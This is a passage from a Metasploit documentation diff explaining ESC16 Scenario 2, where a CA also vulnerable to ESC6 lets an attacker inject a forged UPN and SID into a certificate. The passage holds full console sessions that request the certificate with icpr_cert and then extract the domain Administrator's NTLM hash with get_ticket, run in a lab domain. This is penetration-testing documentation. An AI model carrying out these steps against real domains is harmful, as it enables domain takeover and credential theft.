+[+] 172.16.199.200:88 - Received a valid TGS-Response
+[*] 172.16.199.200:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250603131016_default_172.16.199.200_mit.kerberos.cca_214080.bin
+[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[*] Auxiliary module execution completed
+```
+
+#### ESC16 Scenario 2
+If domain controllers are in Full Enforcement mode (`StrongCertificateBindingEnforcement` == 2), ESC16 alone would normally
+prevent authentication using certificates that lack the required SID extension. However, if the CA is also vulnerable
+to ESC6, which is defined as: `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set under it's `EditFlags` registry key, located here:
+`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>\`
+then the CA accepts arbitrary SAN values from certificate request attribute and an attacker can still bypass strong
+certificate mapping.
+
+In this case, the attacker requests a certificate from the ESC16-affected CA using any client authentication template
+(like "User"), which ensures the SID security extension is omitted. At the same time, they exploit the ESC6 weakness to
+inject a custom Subject Alternative Name that includes both a forged UPN and a specially crafted SID value using the format:
+`URI:tag:microsoft.com,2022-09-14:sid:<SID>`. This format was introduced in the May 2022 KB5014754 update and
+intended to help support strong certificate mappings between the user SID and the certificate.
+
+Because the certificate lacks the official SID extension (due to ESC16) but includes a valid-looking SAN SID URI
+(via ESC6), the domain controller accepts it and maps the certificate using the supplied SID—even in Full Enforcement mode.
+
+The way you would exploit ESC16 Scenario 2 with Metasploit is different than Scenario 1 as we don't need to update
+any LDAP objects, and so we can use the `icpr_cert` module to request a certificate. 
+```
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_sid S-1-5-21-1655260159-4293876351-2321352318-500
+alt_sid => S-1-5-21-1655260159-4293876351-2321352318-500
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set alt_upn Administrator@msf.local
+alt_upn => Administrator@msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set ca msf-DC3-CA
+ca => msf-DC3-CA
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set cert_template User
+cert_template => User
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set RHOSTS 172.16.199.130
+RHOSTS => 172.16.199.130
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbdomain msf.local
+smbdomain => msf.local
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbpass N0tpassword!
+smbpass => N0tpassword!
+msf6 auxiliary(admin/dcerpc/icpr_cert) >  set smbuser user1
+smbuser => user1
+msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+[*] Running module against 172.16.199.130
+[+] 172.16.199.130:445 - The requested certificate was issued.
+[*] 172.16.199.130:445 - Certificate Policies:
+[*] 172.16.199.130:445 - Certificate UPN: Administrator@msf.local
+[*] 172.16.199.130:445 - Certificate URI: tag:microsoft.com,2022-09-14:sid:S-1-5-21-1655260159-4293876351-2321352318-500
+[*] 172.16.199.130:445 - Certificate stored at: /Users/jheysel/.msf4/loot/20250605113503_default_172.16.199.130_windows.ad.cs_258878.pfx
+[*] Auxiliary module execution completed
+
+
+msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) > use admin/kerberos/get_ticket
+[*] Using action GET_TGT - view all 3 actions with the show actions command
+msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhost=172.16.199.130 cert_file=/Users/jheysel/.msf4/loot/20250605113503_default_172.16.199.130_windows.ad.cs_258878.pfx
+[*] Running module against 172.16.199.130
+[+] 172.16.199.130:88 - Received a valid TGT-Response
+[*] 172.16.199.130:88 - TGT MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250605114022_default_172.16.199.130_mit.kerberos.cca_939850.bin
+[*] 172.16.199.130:88 - Getting NTLM hash for Administrator@msf.local
+[+] 172.16.199.130:88 - Received a valid TGS-Response
+[*] 172.16.199.130:88 - TGS MIT Credential Cache ticket saved to /Users/jheysel/.msf4/loot/20250605114022_default_172.16.199.130_mit.kerberos.cca_483040.bin
+[+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:4fd408d8f8ecb20d4b0768a0ac44b71f
+[*] Auxiliary module execution completed
+```
 
 # Authenticating With A Certificate
 Metasploit supports authenticating with certificates in a couple of different ways. These techniques can be used to take
